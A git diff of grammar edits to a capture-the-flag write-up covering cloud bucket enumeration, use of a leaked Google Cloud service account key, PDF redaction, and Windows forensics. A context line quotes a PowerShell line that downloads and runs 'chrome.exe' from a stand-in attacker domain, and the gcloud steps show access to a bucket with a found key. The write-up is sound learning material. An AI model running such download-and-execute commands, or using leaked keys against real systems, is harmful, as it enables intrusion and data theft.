@@ -40,16 +40,16 @@ FLAG: {i_understand_the_mission}
 >
 > https://storage.googleapis.com/out-of-the-bucket/src/index.html
 
-In this challenge, we are given a URl contains a bucket. 
+In this challenge, we are given a URL that contains a bucket. 
 
 ![img-chall](https://i.ibb.co/7pR8fsD/Screenshot-2024-01-15-164145.png)
 
-Since the challenge is about bucket, I assume that it would be something about secret files or secret string inside the bucket or outside the bucket. Then, it would be something related to directory listing. Thus, I start accessing all directories by removing the last path like these URLs:
+Since the challenge is about buckets, I assume that it would be something about secret files or secret strings inside the bucket or outside the bucket. Then, it would be something related to directory listing. So I start to access all directories by removing the last path like these URLs:
 - https://storage.googleapis.com/out-of-the-bucket/src/index.html
 - https://storage.googleapis.com/out-of-the-bucket/src/
 - https://storage.googleapis.com/out-of-the-bucket/
 
-In the third attempt which is the root directory gives us following bucket listing result:
+The third attempt, which is the root directory, gives us the following bucket listing result:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <ListBucketResult
@@ -124,7 +124,7 @@ In the third attempt which is the root directory gives us following bucket listi
     </Contents>
 </ListBucketResult>
 ```  
-As we can see, there are lots of keys inside this bucket represent directories and files:
+As we can see, there are lot of keys in this bucket, representing directories and files:
 - secret/
 - secret/dont_show
 - secret/funny.json
@@ -134,7 +134,7 @@ As we can see, there are lots of keys inside this bucket represent directories a
 - src/static/guam.jpg
 - src/static/style.css
 
-From those directories, the `secret` is the suspicious one. Then, by visiting the page we could download the `dont_show` file. Open the file and we get the flag.
+From these directories, the `secret` is the suspicious one. Then, by visiting the page we could download the `dont_show` file. Open the file and we get the flag.
 
 FLAG: uoftctf{allUsers_is_not_safe}
 
@@ -144,7 +144,7 @@ FLAG: uoftctf{allUsers_is_not_safe}
 >
 > Author: windex
 
-Based on previous resuls from Out of the Bucket challenge, we could see there is a `funny.json` file in the `secret` directory. It looks like this:
+Based on the previous results of the Out of the Bucket challenge, we can see that there is a `funny.json` file in the `secret` directory. It looks like this:
 ```json
 {
     "type": "service_account",
@@ -161,9 +161,9 @@ Based on previous resuls from Out of the Bucket challenge, we could see there is
 }
 ```
 
-By further investigation, this is a **service account key** in JSON format, which is typically used to authenticate a service account on Google Cloud Platform. Using this file, we can connect to a Google Cloud service using `gcloud-cli` tool. 
+Further investigation reveals that this is a **service account key** in JSON format, which is typically used to authenticate a service account on the Google Cloud Platform. We can use this file to connect to a Google Cloud service using the `gcloud-cli` tool
 
-Before using this tool, we should install the Google Cloud SDK. Then, activate the service account with the service account key file. 
+Before using this tool, we should install the Google Cloud SDK. Then, activate the service account using the service account key file. 
 Use this command:
 
 ```
@@ -171,19 +171,19 @@ gcloud auth activate-service-account image-server@out-of-the-bucket.iam.gservice
 gcloud config set project out-of-the-bucket
 ```
  
-Now, we already authenticated to the service account and to list the buckets in the project we can run the `gcloud storage ls` command and we will see there are 2 buckets:
+Now, we that we have already authenticated to the service account and to list the buckets in the project we can run the `gcloud storage ls` command and we will see that there are 2 buckets:
 
 ![buckets](https://i.ibb.co/rcWFWhS/image.png)
 
-From those buckets, the `flag-images` is seems interesting. Now, we can copy or download all objects inside the `flag-images` to our local machine using this command:
+Of these buckets, the `flag-images` seem to be the most interesting. Now we can copy or download all the objects in the `flag-images` to our local machine using this command:
 
 `gsutil -m cp -r gs://flag-images .`
 
-This command will copy an entire directory tree and [perform a parallel multi-threaded/multi-processing copy using the top-level gsutil -m option](https://cloud.google.com/storage/docs/gsutil/commands/cp) to our current directory.
+This command copies an entire directory tree and performs a parallel multi-threaded/multi-processing copy to our current directory using [the top-level `gsutil -m` option]((https://cloud.google.com/storage/docs/gsutil/commands/cp)).
 
 ![result-copy](https://i.ibb.co/7QNL6gR/image.png)
 
-Opening each file, we can see the flag is located in the `xa.png`. 
+If we open each file, we can see that the flag is in xa.png.
 
 ![flag-oob-2](https://i.ibb.co/kXmrkQ3/image.png)
 
@@ -213,7 +213,7 @@ FLAG: uoftctf{you_got_out_of_jail_free}
 > 
 > Author: SteakEnthusiast
 
-We are given with a PDF file. The flag is hidden and covered by the black bar as you can see in this image below:
+We are given with a PDF file. The flag is hidden and covered by the black bar as you can see in the image below:
 
 ![pdf-img](https://i.ibb.co/ygwtx27/image.png)
 
@@ -229,7 +229,7 @@ FLAG: uoftctf{fired_for_leaking_secrets_in_a_pdf}
 > 
 > Author: 0x157
 
-In order to solve this challenge, I already downloaded the VM from the Hourglass challenge. This challenge is still related to the previous challenge, Hourglass. Still in the same directory as the previous two files, I opened the file `update.ps1`.
+To solve this challenge, I have already downloaded the VM from the Hourglass challenge. This challenge is still related to the previous challenge Hourglass challenge. Still in the same directory as the previous two files, I opened the `update.ps1` file.
 
 It looked like this: 
 
@@ -251,7 +251,7 @@ IEX (Invoke-WebRequest -Uri 'https://somec2attackerdomain.com/chrome.exe' -UseBa
 
 Based on the powershell script, it appears to set a key, perform a bitwise operation on ASCII representations, and then download and execute content from a specified URL.
 
-From this we can easily decrypt it. I use CyberChef to do this and at the end of the operation we get a flag.
+From there we can easily decrypt it. I use CyberChef to do this and at the end of the operation we get a flag.
 
 ![flag-nogrep](https://i.ibb.co/gtkjwc7/image.png)
 
@@ -274,13 +274,14 @@ I started the analysis by checking every common directory on this machine, such 
 - Pictures
 - Music
 - Videos
-After a while, I found no flags or information that contained clues other than `Readme` file and the fake flag file. Then I thought about the title of this challenge, Hourglass, and started looking for any files or directories related to "time" and "history". After a while, I found a directory called `History` in the following path:
+
+After a while, I found no flags or information that contained clues other than the `Readme` file and the fake flag file. Then I thought about the title of this challenge, Hourglass, and started looking for any files or directories related to "time" and "history". After a while, I found a directory called `History` in the following path:
 
 `C:\Users\analyst\AppData\Local\Microsoft\Windows\History`
 
 ![img-history](https://i.ibb.co/Zc7QHq1/Screenshot-2024-01-14-194829.png)
 
-After Googling it, it turned out to be the location on a Windows operating system where historical data relating to user activity and file access is stored. By accessing this directory, we can find something that I think could potentially be part of this snapshot system, representing different days when the snapshots were taken.
+After Googling it, it turned out to be the location on a Windows operating system where historical data about to user activity and file access is stored. By accessing this directory, we can find something that I think might potentially be part of this snapshot system, representing different days when the snapshots were taken.
 
 ![date-file](https://i.ibb.co/6yyM3kR/Screenshot-2024-01-14-194850.png)
 
